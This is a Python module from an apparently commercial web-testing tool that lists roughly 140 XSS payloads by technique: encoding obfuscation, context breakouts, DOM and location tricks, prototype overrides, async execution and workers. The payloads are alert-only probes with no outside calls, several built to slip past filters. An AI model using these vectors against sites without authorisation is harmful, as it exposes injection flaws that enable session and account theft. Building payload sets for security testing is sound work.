#!/usr/bin/env python3

"""
XSS Payloads

Complex and sophisticated XSS vectors for testing.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class AdvancedXSSPayloads:
    """XSS payload collection"""
    
    @staticmethod
    def get_obfuscated_payloads() -> List[str]:
        """Obfuscated and encoded XSS payloads"""
        return [
            # String manipulation
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(String.fromCharCode(49))</script>',
            '<script>alert(atob("WFNT"))</script>',
            '<script>alert(unescape("%58%53%53"))</script>',
            '<script>alert(decodeURI("%58%53%53"))</script>',
            '<script>alert(decodeURIComponent("%58%53%53"))</script>',
            
            # Constructor manipulation
            '<script>[].constructor.constructor("alert(1)")()</script>',
            '<script>({}).constructor.constructor("alert(1)")()</script>',
            '<script>(function(){}).constructor("alert(1)")()</script>',
            '<script>Array.constructor.constructor("alert(1)")()</script>',
            '<script>Object.constructor.constructor("alert(1)")()</script>',
            '<script>Function.constructor("alert(1)")()</script>',
            
            # Indirect execution
            '<script>setTimeout(alert,1,1)</script>',
            '<script>setInterval(alert,1,1)</script>',
            '<script>requestAnimationFrame(alert.bind(null,1))</script>',
            '<script>Promise.resolve().then(alert.bind(null,1))</script>',
            '<script>new Promise(alert.bind(null,1))</script>',
            
            # Template literals
            '<script>alert`1`</script>',
            '<script>eval`alert\\`1\\``</script>',
            '<script>Function`alert\\`1\\```</script>',
            '<script>setTimeout`alert\\`1\\``,1`</script>',
            
            # Unicode and hex
            '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
            '<script>\\x61\\x6C\\x65\\x72\\x74(1)</script>',
            '<script>eval("\\u0061\\u006C\\u0065\\u0072\\u0074(1)")</script>',
            '<script>eval("\\x61\\x6C\\x65\\x72\\x74(1)")</script>',
            
            # Octal encoding
            '<script>eval("\\141\\154\\145\\162\\164(1)")</script>',
            '<script>\\141\\154\\145\\162\\164(1)</script>',
            
            # Eval variations
            '<script>eval("ale"+"rt(1)")</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>eval(unescape("%61%6C%65%72%74%28%31%29"))</script>',
        ]
    
    @staticmethod
    def get_context_breaking_payloads() -> List[str]:
        """Context breaking and escape payloads"""
        return [
            # Quote breaking
            '"><script>alert(1)</script>',
            '\"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '\';alert(1);//',
            '\";alert(1);//',
            '`><script>alert(1)</script>',
            
            # Tag breaking
            '</script><script>alert(1)</script>',
            '</title><script>alert(1)</script>',
            '</textarea><script>alert(1)</script>',
            '</style><script>alert(1)</script>',
            '</noscript><script>alert(1)</script>',
            '</comment><script>alert(1)</script>',
            
            # Attribute breaking
            ' onmouseover=alert(1) ',
            ' onclick=alert(1) ',
            ' onfocus=alert(1) ',
            ' onload=alert(1) ',
            ' onerror=alert(1) ',
            ' autofocus onfocus=alert(1) ',
            ' contenteditable onblur=alert(1) ',
            ' draggable ondragstart=alert(1) ',
            
            # URL breaking
            'javascript:alert(1)',
            'vbscript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            
            # CSS breaking
            'expression(alert(1))',
            'url(javascript:alert(1))',
            '/**/alert(1)/**/',
            ';alert(1);',
            '}alert(1);/*',
            '*{xss:expression(alert(1))}',
        ]
    
    @staticmethod
    def get_dom_manipulation_payloads() -> List[str]:
        """DOM manipulation and property access payloads"""
        return [
            # Window properties
            '<script>window["ale"+"rt"](1)</script>',
            '<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>',
            '<script>frames[0].alert(1)</script>',
            '<script>parent.alert(1)</script>',
            '<script>top.alert(1)</script>',
            '<script>self.alert(1)</script>',
            
            # Document properties
            '<script>document.defaultView.alert(1)</script>',
            '<script>document.parentWindow.alert(1)</script>',
            '<script>document.createElement("script").src="data:,alert(1)"</script>',
            '<script>document.body.appendChild(document.createElement("script")).src="data:,alert(1)"</script>',
            
            # Location manipulation
            '<script>location="javascript:alert(1)"</script>',
            '<script>location.href="javascript:alert(1)"</script>',
            '<script>location.replace("javascript:alert(1)")</script>',
            '<script>location.assign("javascript:alert(1)")</script>',
            
            # Dynamic script creation
            '<script>var s=document.createElement("script");s.src="data:,alert(1)";document.head.appendChild(s)</script>',
            '<script>document.head.innerHTML+="<script>alert(1)</script>"</script>',
            '<script>document.body.innerHTML="<script>alert(1)</script>"</script>',
            '<script>document.write("<script>alert(1)</script>")</script>',
            
            # Event creation
            '<script>document.body.onclick=alert</script>',
            '<script>document.body.onmouseover=function(){alert(1)}</script>',
            '<script>document.addEventListener("click",alert)</script>',
            '<script>window.addEventListener("load",function(){alert(1)})</script>',
        ]
    
    @staticmethod
    def get_prototype_pollution_payloads() -> List[str]:
        """Prototype pollution based XSS payloads"""
        return [
            # Object prototype
            '<script>Object.prototype.alert=alert;[].alert(1)</script>',
            '<script>Object.prototype.valueOf=alert;1+{}</script>',
            '<script>Object.prototype.toString=alert;1+""</script>',
            
            # Array prototype
            '<script>Array.prototype.join=alert;[1].join()</script>',
            '<script>Array.prototype.toString=alert;[1]+""</script>',
            '<script>Array.prototype.valueOf=alert;+[]</script>',
            
            # Function prototype
            '<script>Function.prototype.call=alert;eval.call()</script>',
            '<script>Function.prototype.apply=alert;eval.apply()</script>',
            '<script>Function.prototype.bind=alert;eval.bind()</script>',
            
            # String prototype
            '<script>String.prototype.match=alert;"".match()</script>',
            '<script>String.prototype.replace=alert;"".replace()</script>',
            '<script>String.prototype.search=alert;"".search()</script>',
        ]
    
    @staticmethod
    def get_async_payloads() -> List[str]:
        """Asynchronous execution payloads"""
        return [
            # Promises
            '<script>Promise.resolve().then(()=>alert(1))</script>',
            '<script>new Promise(resolve=>resolve(alert(1)))</script>',
            '<script>Promise.reject().catch(()=>alert(1))</script>',
            '<script>Promise.all([]).then(()=>alert(1))</script>',
            '<script>Promise.race([]).then(()=>alert(1))</script>',
            
            # Async/await
            '<script>async function x(){await alert(1)}x()</script>',
            '<script>(async()=>await alert(1))()</script>',
            '<script>async function*x(){yield alert(1)}x().next()</script>',
            
            # Generators
            '<script>function*x(){yield alert(1)}x().next()</script>',
            '<script>(function*(){yield alert(1)})().next()</script>',
            
            # Microtasks
            '<script>queueMicrotask(()=>alert(1))</script>',
            '<script>process.nextTick(()=>alert(1))</script>',
            
            # Timers
            '<script>setTimeout(()=>alert(1))</script>',
            '<script>setInterval(()=>alert(1),1)</script>',
            '<script>setImmediate(()=>alert(1))</script>',
        ]
    
    @staticmethod
    def get_worker_payloads() -> List[str]:
        """Web Worker and Service Worker payloads"""
        return [
            # Web Workers
            '<script>new Worker("data:,alert(1)")</script>',
            '<script>new Worker("data:application/javascript,alert(1)")</script>',
            '<script>new SharedWorker("data:,alert(1)")</script>',
            
            # Service Workers
            '<script>navigator.serviceWorker.register("data:,alert(1)")</script>',
            '<script>navigator.serviceWorker.getRegistration().then(r=>r.update())</script>',
            
            # Import scripts
            '<script>importScripts("data:,alert(1)")</script>',
            '<script>import("data:,alert(1)")</script>',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all XSS payloads"""
        payloads = []
        payloads.extend(AdvancedXSSPayloads.get_obfuscated_payloads())
        payloads.extend(AdvancedXSSPayloads.get_context_breaking_payloads())
        payloads.extend(AdvancedXSSPayloads.get_dom_manipulation_payloads())
        payloads.extend(AdvancedXSSPayloads.get_prototype_pollution_payloads())
        payloads.extend(AdvancedXSSPayloads.get_async_payloads())
        payloads.extend(AdvancedXSSPayloads.get_worker_payloads())
        return payloads